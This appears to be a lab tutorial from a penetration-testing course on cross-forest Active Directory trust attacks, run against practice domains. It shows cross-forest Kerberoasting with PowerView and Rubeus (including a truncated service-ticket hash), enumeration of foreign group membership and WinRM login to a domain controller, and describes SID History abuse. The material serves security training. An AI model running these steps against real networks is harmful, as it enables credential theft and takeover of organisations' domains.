- [Cross-Forest Trust Attacks](#cross-forest-trust-attacks)
  - [Cross-Forest Trust Attacks - from Windwos](#cross-forest-trust-attacks---from-windwos)
    - [Cross-Forest Kerberoasting](#cross-forest-kerberoasting)
      - [Enumerating Accounts for Associated SPNs using Get-DomainUser](#enumerating-accounts-for-associated-spns-using-get-domainuser)
      - [Enumerating the mssqlsvc Account](#enumerating-the-mssqlsvc-account)
      - [Performing a Kerberoasting Attacking with Rubeus Using /domain Flag](#performing-a-kerberoasting-attacking-with-rubeus-using-domain-flag)
    - [Admin Password Re-Use \& Group Membership](#admin-password-re-use--group-membership)
      - [Using Get-DomainForeignGroupMember](#using-get-domainforeigngroupmember)
      - [Accessing DC03 Using Enter-PSSession](#accessing-dc03-using-enter-pssession)
    - [SID History Abuse - Cross Forest](#sid-history-abuse---cross-forest)

---

# Cross-Forest Trust Attacks

## Cross-Forest Trust Attacks - from Windwos

### Cross-Forest Kerberoasting

Kerberos attacks such as Kerberoasting and ASREPRoasting can be performed across trusts, depending on the trust direction. In a situation where you are positioned in a domain with either an inbound or bidirectional domain/forest trust, you can likely perform various attacks to gain a foothold. Sometimes you cannot escalate privileges in your current domain, but instead can obtain a Kerberos ticket and crack a hash for an administrator user in another domain that has Domain/Enterprise Admin privileges in both domains.

#### Enumerating Accounts for Associated SPNs using Get-DomainUser

You can utilize PowerView to enumerate accounts in a target domain that have SPNs associated with them.

```powershell
PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

samaccountname
--------------
krbtgt
mssqlsvc
```

#### Enumerating the mssqlsvc Account

You see that there is on account with an SPN in the target domain. A quick check shows that this account is a member of the Domain Admins group in the target domain, so if you can Kerberoast it and crack the hash offline, you'd have full admin rights to the target domain.

```powershell
PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof

samaccountname memberof
-------------- --------
mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
```

#### Performing a Kerberoasting Attacking with Rubeus Using /domain Flag

Perform a Kerberoasting attack across the trust using Rubeus. You run the tool and include the ```/domain:``` flag and specify the target.

```powershell
PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : mssqlsvc
[*] Target Domain          : FREIGHTLOGISTICS.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/DC=FREIGHTLOGISTICS,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] SamAccountName         : mssqlsvc
[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:1433
[*] PwdLastSet             : 3/24/2022 12:47:52 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$<SNIP>
```

You could run the hash through Hashcat. If it cracks, you've now quickly expanded your access to fully control two domains by leveraging a pretty standard attack and abusing the authentication direction and setup of the bidirectional forest trust.

### Admin Password Re-Use & Group Membership

From time to time, you'll run into a situation where there is a bidirectional forest trust managed by admins from the same company. If you can take over Domain A and obtain cleartext passwords or NT hashes for either the built-in Administrator account, and Domain B has a highly privileged account with the same name, then it is worth checking for passowrd reuse across the two forests.

You may also see users or admins from Domain A as members of a group in Domain B. Only Domain Local Groups allow security principals from outside its forest. You may see a Domain Admin or Enterprise Admin from Domain A as a member of the built-in Administrators group in Domain B in a bidirectional forest trust relationship. If you can take over this admin user in Domain A, you would gain full administrative access to Domain B based on group membership.

#### Using Get-DomainForeignGroupMember

You can use the PowerView function Get-DomainForeignGroupMember to enumerate groups with users that do not belong to the domain, also known as foreign group membership. Try this against the FREIGHTLOGISTICS.LOCAL domain with which you have an external bidirectional forest trust.

```powershell
PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

GroupDomain             : FREIGHTLOGISTICS.LOCAL
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
MemberDomain            : FREIGHTLOGISTICS.LOCAL
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
                          TICS,DC=LOCAL

PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500

INLANEFREIGHT\administrator
```

#### Accessing DC03 Using Enter-PSSession

The above command output shows that the built-in Administrators group in FREIGHTLOGISTICS.LOCAL has the built-in Administrator account for the INLANEFREIGHT.LOCAL domain as a member. You can verify this access using the Enter-PSSession cmdlet to connect over WinRM.

```powershell
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
inlanefreight\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : ACADEMY-EA-DC03
   Primary Dns Suffix  . . . . . . . : FREIGHTLOGISTICS.LOCAL
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : FREIGHTLOGISTICS.LOCAL
```

From the command output above, you can see that you successfully authenticated to the Domain Controller in the FREIGHTLOGISTICS.LOCAL domain using the Administrator account from the INLANEFREIGHT.LOCAL domain across the bidirectional forest trust. This can be a quick win after taking control of a domain and is always worth checking for if a bidirectional forest trust is present during an assessment and the second forest is in-scope.

### SID History Abuse - Cross Forest

SID History can also be abused across a forest trust. If a user is migrated from one forest to another and SID Filtering is not enabled, it becomes possible to add a SID from the other forest, and this SID will be added to the user's token when authenticating across the trust. If the SID of an account with administrative privileges in Forest A is added to the SID histroy attribute of an account in Forest B, assuming they can authenticate across the forest, then this account will have administrative privileges when accessing resources in the partner forest. In the below diagram, you can see an example of the jjones user being migrated from the INLANEFREIGHT.LOCAL domain to the CORP.LOCAL domain in a different forest. If SID Filtering is not enabled when this migration is made and the user has administrative privileges in the INLANEFREIGHT.LOCAL domain, then they will retain their administrative rights/access in INLANEFREIGHT.LOCAL while being a member of the new domain, CORP.LOCAL in the second forest.

![ad cross-forest attacks 1](../../../../images/ad_cross_forest_attacks1.png)

